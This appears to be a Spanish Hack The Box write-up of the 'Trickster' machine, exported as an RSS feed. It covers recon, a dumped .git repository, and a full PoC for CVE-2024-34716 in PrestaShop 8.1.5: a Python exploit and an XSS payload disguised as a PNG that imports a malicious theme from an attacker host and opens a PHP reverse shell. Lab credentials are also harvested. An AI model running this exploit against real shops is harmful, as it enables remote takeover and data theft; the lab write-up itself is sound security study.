<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[HTB]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>HTB</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Sat, 15 Feb 2025 12:38:33 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Sat, 15 Feb 2025 12:38:30 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[1.Recon]]></title><description><![CDATA[ 
 <br>Nmap TCP port SYN scan<br>sudo nmap -sS -Pn -n --min-rate 5000 -p- trickster.htb -oG nmapsS
[sudo] password for cher0: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 10:15 CET
Nmap scan report for trickster.htb (10.10.11.34)
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.42 seconds
<br>Nmap TCP CV scan<br>sudo nmap -sCV -Pn -n --min-rate 5000 -p 22,80 trickster.htb -oG nmapsCV 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 10:15 CET
Nmap scan report for trickster.htb (10.10.11.34)
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
<br><br><img alt="Pasted image 20250212101724.png" src="machines/trickster/imgs/pasted-image-20250212101724.png"><br>
El apartado "shop" nos redirecciona a la siguiente url: <a rel="noopener nofollow" class="external-link" href="http://shop.trickster.htb/" target="_blank">http://shop.trickster.htb/</a><br>
la metemos en el /etc/hosts<br>10.10.11.34 trickster.htb shop.trickster.htb
<br><br>Vamos a aplicar Fuzzing;<br><br>feroxbuster -u http://trickster.htb -r -w /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt -C 503
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.11.0
───────────────────────────┬──────────────────────
     Target Url            │ http://trickster.htb
     Threads               │ 50
     Wordlist              │ /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt
     Status Code Filters   │ [503]
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.11.0
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Extract Links         │ true
     HTTP methods          │ [GET]
     Follow Redirects      │ true
     Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        2l       87w     2438c http://trickster.htb/assets/js/breakpoints.min.js
200      GET       37l       80w      568c http://trickster.htb/assets/css/noscript.css
200      GET      587l     1232w    11847c http://trickster.htb/assets/js/util.js
200      GET      401l      738w     8035c http://trickster.htb/assets/js/main.js
200      GET       22l       68w     8886c http://trickster.htb/images/overlay.png
200      GET     1638l     3543w    34125c http://trickster.htb/assets/css/main.css
200      GET        2l     1283w    86927c http://trickster.htb/assets/js/jquery.min.js
503      GET       11l       42w      378c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
503      GET       11l       42w      378c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     3386l    19800w  1485483c http://trickster.htb/images/pic01.jpg
200      GET     7017l    47787w  3060292c http://trickster.htb/images/pic02.jpg
200      GET     7166l    43779w  3126314c http://trickster.htb/images/pic03.jpg
200      GET      355l      927w    12683c http://trickster.htb/
200      GET    13704l    73264w  5732348c http://trickster.htb/images/bg.jpg
200      GET       20l       94w     1730c http://trickster.htb/images/
<br><br><br>➜  ~ wappalyzer -i http://shop.trickster.htb
http://shop.trickster.htb Apache HTTP Server v2.4.52, Ubuntu, PrestaShop, jQuery v3.5.1, jQuery UI v1.10.3, PHP, Bootstrap, core-js v2.6.12, jQuery Migrate v3.1.0, Cart Functionality, Open Graph
<br>El subdomino usa Prestashop;<br>
PrestaShop es un sistema de gestión de contenidos libre y de código abierto pensado para construir desde cero tiendas en línea de comercio electrónico. Enfocado para permitir crear tiendas en línea desde pequeñas empresas a grandes corporaciones<br><br>feroxbuster -u http://shop.trickster.htb -r -w /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt -C 503 403
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.11.0
───────────────────────────┬──────────────────────
     Target Url            │ http://shop.trickster.htb
     Threads               │ 50
     Wordlist              │ /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt
     Status Code Filters   │ [503, 403]
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.11.0
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Extract Links         │ true
     HTTP methods          │ [GET]
     Follow Redirects      │ true
     Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET     1043l     2429w    44977c http://shop.trickster.htb/password-recovery
404      GET     1006l     2319w    43228c http://shop.trickster.htb/log
200      GET        7l       17w      112c http://shop.trickster.htb/.git/config
200      GET        1l        2w       28c http://shop.trickster.htb/.git/HEAD
200      GET     1423l     2799w    53077c http://shop.trickster.htb/registration
200      GET        1l       10w       73c http://shop.trickster.htb/.git/description
200      GET        1l        3w       20c http://shop.trickster.htb/.git/COMMIT_EDITMSG
200      GET     1071l     2387w    44984c http://shop.trickster.htb/guest-tracking
200      GET        1l       11w      163c http://shop.trickster.htb/.git/logs/HEAD
200      GET        6l       43w      240c http://shop.trickster.htb/.git/info/exclude
200      GET       53l      234w     1374c http://shop.trickster.htb/.git/hooks/pre-push.sample
200      GET       78l      499w     2783c http://shop.trickster.htb/.git/hooks/push-to-checkout.sample
200      GET       42l      238w     1492c http://shop.trickster.htb/.git/hooks/prepare-commit-msg.sample
200      GET        8l       32w      189c http://shop.trickster.htb/.git/hooks/post-update.sample
200      GET       13l       67w      416c http://shop.trickster.htb/.git/hooks/pre-merge-commit.sample
200      GET       24l       83w      544c http://shop.trickster.htb/.git/hooks/pre-receive.sample
200      GET       14l       69w      424c http://shop.trickster.htb/.git/hooks/pre-applypatch.sample
200      GET       49l      279w     1643c http://shop.trickster.htb/.git/hooks/pre-commit.sample
200      GET      174l      675w     4726c http://shop.trickster.htb/.git/hooks/fsmonitor-watchman.sample
200      GET      978l     2780w   316386c http://shop.trickster.htb/.git/index
200      GET      128l      546w     3650c http://shop.trickster.htb/.git/hooks/update.sample
200      GET       15l       79w      478c http://shop.trickster.htb/.git/hooks/applypatch-msg.sample
200      GET       77l      323w     2308c http://shop.trickster.htb/.git/hooks/sendemail-validate.sample
200      GET      169l      798w     4898c http://shop.trickster.htb/.git/hooks/pre-rebase.sample
200      GET       24l      163w      896c http://shop.trickster.htb/.git/hooks/commit-msg.sample
200      GET        1l        1w       41c http://shop.trickster.htb/.git/refs/heads/admin_panel
404      GET     1006l     2319w    43251c http://shop.trickster.htb/upload/
200      GET     1155l     2446w    46526c http://shop.trickster.htb/login
200      GET     1155l     2446w    46636c http://shop.trickster.htb/login?back=my-account
404      GET     1006l     2319w    43294c http://shop.trickster.htb/.git/hooks/.git
200      GET     1102l     2444w    46283c http://shop.trickster.htb/cart?action=show
404      GET     1006l     2319w    43326c http://shop.trickster.htb/.git/refs/heads/.git/
404      GET     1006l     2319w    43350c http://shop.trickster.htb/.git/refs/heads/.git/refs
200      GET     1155l     2446w    46615c http://shop.trickster.htb/login?back=history
200      GET     1051l     2357w    44462c http://shop.trickster.htb/search
404      GET     1006l     2319w    43345c http://shop.trickster.htb/.git/refs/tags/.git/refs
404      GET     1006l     2319w    43325c http://shop.trickster.htb/.git/refs/tags/.git/
200      GET     1155l     2446w    46629c http://shop.trickster.htb/login?back=addresses
404      GET     1006l     2319w    43325c http://shop.trickster.htb/.git/logs/refs/.git/
404      GET     1006l     2319w    43309c http://shop.trickster.htb/.git/branches/.git

<br>Durante el fuzzing encontramos un repositorio /.git accesible;  tratamos de dumpearlo<br><br>Con la herramienta de <a data-tooltip-position="top" aria-label="https://github.com/arthaud/git-dumper" rel="noopener nofollow" class="external-link" href="https://github.com/arthaud/git-dumper" target="_blank">git-dumper</a> dumpeamos todo el directorio de /.git<br> ./git_dumper.py http://shop.trickster.htb/.git/ DUMP
<br>DUMP:<br>
En el directorio encontramos varios archivos, entre ellos un Makefile lo que nos puede dar una pista de que nos enfrentamos a un contenedor de Docker y varios archivos .php lo que nos confirma que el servidor maneja lenguaje php que nos puede ser de ayuda para explotar la maquina<br>(venv) ➜  DUMP git:(admin_panel) ls -ls
total 216
  8 -rw-rw-r-- 1 cher0 cher0   5054 Feb 12 12:16 INSTALL.txt
  4 -rw-rw-r-- 1 cher0 cher0    522 Feb 12 12:16 Install_PrestaShop.html
180 -rw-rw-r-- 1 cher0 cher0 183862 Feb 12 12:16 LICENSES
  4 -rw-rw-r-- 1 cher0 cher0    863 Feb 12 12:16 Makefile
  4 drwxrwxr-x 8 cher0 cher0   4096 Feb 12 12:16 admin634ewutrx1jgitlooaj
  4 -rw-rw-r-- 1 cher0 cher0   1305 Feb 12 12:16 autoload.php
  4 -rw-rw-r-- 1 cher0 cher0   2506 Feb 12 12:16 error500.html
  4 -rw-rw-r-- 1 cher0 cher0   1169 Feb 12 12:16 index.php
  4 -rw-rw-r-- 1 cher0 cher0   1256 Feb 12 12:16 init.php

<br>En el Install.txt vemos que la instalacion se trata de un Pentashop 8 lo que nos puede indicar que el software esta usando su version 8; tambien nos confirma que precisa de PHP v 7.2 o superior y un servidor de datos MySQL.<br><img alt="Pasted image 20250212122216.png" src="machines/trickster/imgs/pasted-image-20250212122216.png"><br>si entramos en el endpoint /admin634ewutrx1jgitlooaj encontramos un admin panel en shop; ademas descubrimos la version de PrestaShop que corre en la 8.1.5<br><img alt="Pasted image 20250213103827.png" src="machines/trickster/imgs/pasted-image-20250213103827.png"><br><br>Esta version de PrestaShop es vulnerable a XSS ; <a data-tooltip-position="top" aria-label="https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-45vm-3j38-7p78" rel="noopener nofollow" class="external-link" href="https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-45vm-3j38-7p78" target="_blank">github</a><br>El exploit se puede triggerear en el contact form de la pagina; un atacante puede subir un archivo malicioso que triggerea el XSS cuando lo abre el administrador ;<br>Nos dirigimos al formulario<br>http://shop.trickster.htb/contact-us
<br><img alt="Pasted image 20250213104457.png" src="machines/trickster/imgs/pasted-image-20250213104457.png"><br>Encuentro este <a data-tooltip-position="top" aria-label="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/" rel="noopener nofollow" class="external-link" href="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/" target="_blank">documento</a> que detalla la explotacion de la vulnerabilidad <br>Nos bajamos el script automatizado de github y lo analizamos, el documento ya aclara como se explota la vulnerabilidad XSS pero podemos llegar a RCE enviando un .html malicioso disfrazado de imagen png;<br>➜  CVE-2024-34716_PoC git:(main) ls -laF 
total 7320
drwxrwxr-x 3 cher0 cher0    4096 Feb 13 10:51 ./
drwxrwxr-x 5 cher0 cher0    4096 Feb 13 10:51 ../
drwxrwxr-x 8 cher0 cher0    4096 Feb 13 10:51 .git/
-rw-rw-r-- 1 cher0 cher0      47 Feb 13 10:51 .gitignore
-rw-rw-r-- 1 cher0 cher0     346 Feb 13 10:51 README.md
-rw-rw-r-- 1 cher0 cher0    4434 Feb 13 10:51 exploit.html
-rw-rw-r-- 1 cher0 cher0    5100 Feb 13 10:51 exploit.py
-rw-rw-r-- 1 cher0 cher0 7444481 Feb 13 10:51 ps_next_8_theme_malicious_old.zip
-rw-rw-r-- 1 cher0 cher0      32 Feb 13 10:51 requirements.txt
-rw-rw-r-- 1 cher0 cher0    5496 Feb 13 10:51 reverse_shell_template.php

<br>Atached a zip theme file that was used for testing and the same ZIP contains a .htaccess file with the content below, which will enforce and allow access to the directory where we host our reverse_shell.php. It’s basically to allow everyone to view or interact with the contents of the directory without restrictions, because if we didn’t do this, we wouldn’t be able to access our reverse_shell.php that grants us a reverse shell and we would get forbidden instead.<br>&lt;IfModule mod_authz_core.c&gt;
 Require all granted
&lt;/IfModule&gt;
<br><br>Analizamos el siguiente PoC del CVE para conseguir RCE en PrestaShop;<br>import argparse, requests, subprocess, time, threading, atexit, http.server, socketserver,zipfile,shutil,os
from bs4 import BeautifulSoup


print_lock = threading.Lock()
stop_event = threading.Event()

def __parse_args():    
    parser = argparse.ArgumentParser(description="CVE-2024-34716 Exploit")
    parser.add_argument("--url", help="The Presta Shop base url.", required=True)
    parser.add_argument("--email", help="The email address of admin user.", required=True)
    parser.add_argument("--local-ip", help="Local HTTP Server IP.", required=True)
    parser.add_argument("--admin-path", help="The Presta Shop admin path.", required=True) 
    
    args = parser.parse_args()
    
    host_url = args.url
    email = args.email
    local_ip = args.local_ip
    admin_path = args.admin_path

    print("[X] Starting exploit with:")
    print(f"\tUrl: {host_url}")
    print(f"\tEmail: {email}")
    print(f"\tLocal IP: {local_ip}")
    print(f"\tAdmin Path: {admin_path}")
                
    return (host_url, email, local_ip, admin_path)
    
    
def send_get_requests(url, interval=5):
    while not stop_event.is_set():
        try:
            response = requests.get(url)
            if response.status_code == 504 or response.status_code == 200:
                stop_event.set()
                return
            print(f"GET request to {url}: {response.status_code}")
            
        except requests.RequestException as e:
            with print_lock:
                print(f"Error during GET request: {e}") # Can comment this out if thread isn't stopped.
        time.sleep(interval)


def run_http_server():
    PORT = 5000
    with socketserver.TCPServer(("", PORT), CustomRequestHandler) as httpd:
        with print_lock:
            print("Serving at http.Server on port", PORT)
        while not stop_event.is_set():
            httpd.handle_request()
        

def main():    
    host_url, email, local_ip, admin_path = __parse_args()

    with open('./exploit.html', 'r') as file:
        html_content = file.read()

    if host_url[-1] == '/':
        host_url = host_url[:-1]

    html_content = html_content.replace("BASE_URL", f'"{host_url}"')
    html_content = html_content.replace("ATTACKER_IP", f'"{local_ip}"')
    html_content = html_content.replace("ATTACKER_PORT", "5000")
    html_content = html_content.replace("ADMIN_PATH", f'"{admin_path}"')
    html_content = html_content.replace("FILE_NAME", '"ps_next_8_theme_malicious.zip"')

    with open('./reverse_shell_template.php', 'r') as file:
        reverse_shell_content = file.read()
    
    reverse_shell_content = reverse_shell_content.replace("ATTACKER_IP", f'"{local_ip}"')
    reverse_shell_content = reverse_shell_content.replace("ATTACKER_PORT", "12345")

    with open('./reverse_shell.php', 'w') as file:
        file.write(reverse_shell_content)
    
    shutil.copy('ps_next_8_theme_malicious_old.zip', 'ps_next_8_theme_malicious.zip')
    with zipfile.ZipFile('ps_next_8_theme_malicious.zip', 'a') as zipf:
        zipf.write('reverse_shell.php','reverse_shell_new.php')



    url = f"{host_url}/contact-us"

    response = requests.get(url)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': 'token'})['value']
    cookies = response.cookies

    files = {
        'fileUpload': ('test.png', html_content, 'image/png'),
    }

    data = {
        'id_contact': '2',
        'from': email,
        'message': 'pwned',
        'url': '',
        'token': token,
        'submitMessage': 'Send'
    }

    response = requests.post(url, files=files, data=data, cookies=cookies)
    url = f"{host_url}/themes/next/reverse_shell_new.php"

    req_thread = threading.Thread(target=send_get_requests, args=(url, 15,))
    req_thread.daemon = True
    req_thread.start()
    
    server_thread = threading.Thread(target=run_http_server)
    server_thread.daemon = True
    server_thread.start()

    if response.status_code == 200:
        print(f"[X] Ncat is now listening on port 12345. Press Ctrl+C to terminate.")
        
        output = subprocess.call(["ncat", "-lnvp", "12345"], shell=False)
        if b"Ncat: Connection from " in output:
            with print_lock:
                print("Stopping threads!")
            stop_event.set()
        else:
            print(f"DEBUG:: {output}")
    else:
        print(f"[!] Failed to send the message. Status code: {response.status_code} Reason: {response.reason}")


def clean():
    if os.path.exists('ps_next_8_theme_malicious.zip'):
        os.remove('ps_next_8_theme_malicious.zip')
    if os.path.exists('reverse_shell.php'):
        os.remove('reverse_shell.php')

class CustomRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        with print_lock:
            print(f"Request: {self.command} {self.path} {self.request_version}")
            print(f"Response: {code} {size}")
        super().log_request(code, size)



if __name__ == "__main__":
    clean()
    atexit.register(clean)
    main()

<br><br>Esta función configura y parsea los argumentos necesarios para ejecutar el exploit:<br>
<br>Argumentos requeridos :

<br>--url: URL base del sitio vulnerable.
<br>--email: Dirección de correo electrónico del administrador.
<br>--local-ip: IP local donde se ejecutará el servidor HTTP y el shell inverso.
<br>--admin-path: Ruta del panel de administración de PrestaShop.


<br>Después de parsear los argumentos, imprime la configuración seleccionada.<br><br>Esta función envía solicitudes GET repetidas a una URL específica hasta que ocurra una condición de detención (stop_event.is_set()).<br>
<br>Si recibe un código de respuesta 504 o 200, detiene las solicitudes.
<br>Utiliza un intervalo entre solicitudes para evitar saturar el servidor.
<br><br>Levanta un servidor HTTP local en el puerto 5000:<br>
<br>Usa CustomRequestHandler como manejador personalizado para registrar las solicitudes entrantes.
<br>El servidor permanece activo hasta que se establezca stop_event.****
<br><br>Esta es la función principal del script, donde ocurre la lógica del exploit:<br><br>
<br>Lee el archivo exploit.html y reemplaza marcadores de posición (BASE_URL, ATTACKER_IP, etc.) con los valores proporcionados por el usuario.

<br>exploit.html:


<br>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;

&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta viewport="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Exploit&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;script&gt;
        const baseUrl = BASE_URL;
        const path = ADMIN_PATH;
        const httpServerIp = ATTACKER_IP;
        const httpServerPort = ATTACKER_PORT;
        const fileNameOfTheme = FILE_NAME;

        async function fetchTokenFromHTML() {
            const url = `${baseUrl}/${path}/index.php/improve/design/themes/import`;
            try {
                const response = await fetch(url, {
                    method: 'GET',
                    credentials: 'include',
                    redirect: 'follow'
                });
                if (!response.ok) throw new Error('Failed to fetch the page for token extraction. Status: ' + response.status);

                const htmlText = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(htmlText, "text/html");

                const anchor = doc.querySelector('a.btn.btn-lg.btn-outline-danger.mr-3');
                const href = anchor ? anchor.getAttribute('href') : null;
                const match = href ? href.match(/_token=([^&amp;]+)/) : null;
                const token = match ? match[1] : null;
                if (!token) throw new Error('Token not found in anchor tag href.');

                console.log('Extracted Token from HTML:', token);
                return token;
            } catch (error) {
                console.error('Error fetching token from HTML content:', error);
                return null;
            }
        }

        async function fetchCSRFToken(token) {
            const csrfUrl = `${baseUrl}/${path}/index.php/improve/design/themes/import?_token=${token}`;
            try {
                const response = await fetch(csrfUrl, {
                    method: 'GET',
                    credentials: 'include',
                    redirect: 'follow'
                });
                if (!response.ok) throw new Error('Failed to fetch the page for CSRF token extraction. Status: ' + response.status);

                const htmlText = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(htmlText, "text/html");

                const csrfTokenInput = doc.querySelector('input[name="import_theme[_token]"]');
                const csrfToken = csrfTokenInput ? csrfTokenInput.value : null;
                if (!csrfToken) throw new Error('CSRF token not found in HTML content.');

                console.log('Extracted CSRF Token:', csrfToken);
                return csrfToken;
            } catch (error) {
                console.error('Error fetching CSRF token:', error);
                return null;
            }
        }

        async function importTheme() {
            try {
                const locationHeaderToken = await fetchTokenFromHTML();
                if (!locationHeaderToken) {
                    console.error('Failed to fetch token from HTML');
                    return;
                }

                const csrfToken = await fetchCSRFToken(locationHeaderToken);
                if (!csrfToken) {
                    console.error('Failed to fetch CSRF token');
                    return;
                }

                const formData = new FormData();
                formData.append('import_theme[import_from_web]', `http://${httpServerIp}:${httpServerPort}/${fileNameOfTheme}`);
                formData.append('import_theme[_token]', csrfToken);

                const postUrl = `/${path}/index.php/improve/design/themes/import?_token=${locationHeaderToken}`;
                console.log('POST URL:', postUrl);

                const response = await fetch(postUrl, {
                    method: 'POST',
                    body: formData,
                });

                if (response.ok) {
                    console.log('Theme imported successfully');
                } else {
                    console.error('Failed to import theme. Response Status:', response.status);
                }
            } catch (error) {
                console.error('Error importing theme:', error);
            }
        }

        document.addEventListener('DOMContentLoaded', function () {
            importTheme();
        });
    &lt;/script&gt;
&lt;/body&gt;

&lt;/html&gt;
<br><br>
<br>El html extrae dos tokens necesarios para autenticar las solicitudes en el panel de administración de PrestaShop.
<br>Envía una solicitud POST para importar un tema malicioso desde el servidor HTTP local del atacante.
<br>Si todo funciona correctamente, el tema malicioso se instala en el servidor objetivo, permitiendonos ejecutar código arbitrario.
<br>
<br>
Lee el archivo reverse_shell_template.php, reemplaza los marcadores de posición y guarda el resultado en reverse_shell.php.

<br>la reverse_shell_template.php es la mítica rev-shell de <a data-tooltip-position="top" aria-label="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" rel="noopener nofollow" class="external-link" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank">pentestmonkey</a>


<br>
Copia el archivo ps_next_8_theme_malicious_old.zip, agrega el archivo reverse_shell.php dentro del ZIP y lo guarda como ps_next_8_theme_malicious.zip.

<br><br>
<br>Realiza una solicitud GET a la página /contact-us del sitio objetivo.
<br>Extrae el valor del token CSRF del formulario usando BeautifulSoup.
<br><br>
<br>Prepara una solicitud POST con los siguientes datos:

<br>Un archivo adjunto (exploit.html disfrazado como imagen).
<br>Datos del formulario con el token CSRF, dirección de correo electrónico y mensaje.


<br>Envía la solicitud POST a /contact-us.
<br><br>
<br>Inicia un hilo para enviar solicitudes GET repetidas al archivo PHP malicioso (reverse_shell_new.php) en el servidor objetivo.
<br>Inicia otro hilo para ejecutar el servidor HTTP local.
<br><br>
<br>Si la solicitud POST tiene éxito, inicia un servidor de escucha con ncat en el puerto 12345 para recibir la conexión inversa del shell.
<br>Si se detecta una conexión, detiene todos los hilos.
<br><br>Realiza una limpieza al finalizar:<br>
<br>Elimina el archivo ZIP modificado (ps_next_8_theme_malicious.zip).
<br>Elimina el archivo PHP  (reverse_shell.php).
<br><br><br>Nos creamos una cuenta en el prestashop:<br>
<img alt="Pasted image 20250213112820.png" src="machines/trickster/imgs/pasted-image-20250213112820.png"><br><img alt="Pasted image 20250213120710.png" src="machines/trickster/imgs/pasted-image-20250213120710.png"><br><br>$ cat /etc/passwd | grep -E "/bin/sh|/bin/bash"
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:trickster:/home/james:/bin/bash
adam:x:1002:1002::/home/adam:/bin/bash
runner:x:1003:1003::/home/runner:/bin/sh
<br>Seguimos en PrivEsc ---&gt; ]]></description><link>machines/trickster/1.recon.html</link><guid isPermaLink="false">Machines/Trickster/1.Recon.md</guid><pubDate>Thu, 13 Feb 2025 11:10:30 GMT</pubDate><enclosure url="machines/trickster/imgs/pasted-image-20250212101724.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/trickster/imgs/pasted-image-20250212101724.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.PrivEsc]]></title><description><![CDATA[ 
 <br><br>Directorio /var/www<br>www-data@trickster:~$ ls -la
total 20
drwxr-xr-x  5 root     root     4096 Sep 13 12:24 .
drwxr-xr-x 14 root     root     4096 Sep 13 12:24 ..
drwxr-xr-x  2 root     root     4096 Sep 13 12:24 html
drwxr-xr-x 28 www-data www-data 4096 Sep 17 18:07 prestashop
drwxr-xr-x  5 www-data www-data 4096 Feb 13 15:09 trickster
<br><br>www-data@trickster:~$ find / -perm -4000 -print 2&gt;/dev/null
/snap/core20/2379/usr/bin/chfn
/snap/core20/2379/usr/bin/chsh
/snap/core20/2379/usr/bin/gpasswd
/snap/core20/2379/usr/bin/mount
/snap/core20/2379/usr/bin/newgrp
/snap/core20/2379/usr/bin/passwd
/snap/core20/2379/usr/bin/su
/snap/core20/2379/usr/bin/sudo
/snap/core20/2379/usr/bin/umount
/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2379/usr/lib/openssh/ssh-keysign
/snap/core20/2318/usr/bin/chfn
/snap/core20/2318/usr/bin/chsh
/snap/core20/2318/usr/bin/gpasswd
/snap/core20/2318/usr/bin/mount
/snap/core20/2318/usr/bin/newgrp
/snap/core20/2318/usr/bin/passwd
/snap/core20/2318/usr/bin/su
/snap/core20/2318/usr/bin/sudo
/snap/core20/2318/usr/bin/umount
/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2318/usr/lib/openssh/ssh-keysign
/snap/snapd/21759/usr/lib/snapd/snap-confine
/usr/libexec/polkit-agent-helper-1
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/opt/google/chrome/chrome-sandbox
<br>GUID<br>www-data@trickster:~$ find / -perm -2000 -print 2&gt;/dev/null
/var/spool/postfix/public
/var/mail
/var/local
/var/log/journal
/var/log/journal/add7a2fa4f114fc2b05f9d28de9f9bb3
/var/log/mysql
/run/log/journal
/snap/core20/2379/usr/bin/chage
/snap/core20/2379/usr/bin/expiry
/snap/core20/2379/usr/bin/ssh-agent
/snap/core20/2379/usr/sbin/pam_extrausers_chkpwd
/snap/core20/2379/usr/sbin/unix_chkpwd
/snap/core20/2379/var/mail
/snap/core20/2318/usr/bin/chage
/snap/core20/2318/usr/bin/expiry
/snap/core20/2318/usr/bin/ssh-agent
/snap/core20/2318/usr/sbin/pam_extrausers_chkpwd
/snap/core20/2318/usr/sbin/unix_chkpwd
/snap/core20/2318/var/mail
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/crontab
/usr/bin/chage
/usr/bin/ssh-agent
/usr/sbin/postqueue
/usr/sbin/unix_chkpwd
/usr/sbin/postdrop
/usr/sbin/pam_extrausers_chkpwd
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/local/share/fonts

<br><br>Revisamos las conexiones de la maquina<br>$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:41935         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -              
<br>Parece que hay un mysql abierto; era de esperar porque es necesario para el funcionamiento de la pagina web.<br>Vamos a hacer un fuzzeo del directorio de Prestashop para buscar algo relacionado con una base de datos ; seguramente mysql que es la que funciona en el puerto 3306:<br>grep -ri "mysql" /var/www/
grep -risE "(mysql|dbname|db_user|db_password|db_host|database)" /var/www/
<br>Encuentro informacion interesante en la siguiente ruta<br>/var/www/prestashop/var/cache/prod/FrontContainer.php
<br>        return [
            'database_host' =&gt; '127.0.0.1',
            'database_port' =&gt; '',
            'database_name' =&gt; 'prestashop',
            'database_user' =&gt; 'ps_user',
            'database_password' =&gt; 'prest@shop_o',
            'database_prefix' =&gt; 'ps_',
            'database_engine' =&gt; 'InnoDB',
            'mailer_transport' =&gt; 'smtp',
            'mailer_host' =&gt; '127.0.0.1',
            'mailer_user' =&gt; NULL,
            'mailer_password' =&gt; NULL,
            'secret' =&gt; 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog',
            'ps_caching' =&gt; 'CacheMemcache',
            'ps_cache_enable' =&gt; false,
            'ps_creation_date' =&gt; '2024-05-25',
            'locale' =&gt; 'en-US',
            'use_debug_toolbar' =&gt; true,
            'cookie_key' =&gt; '8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i',
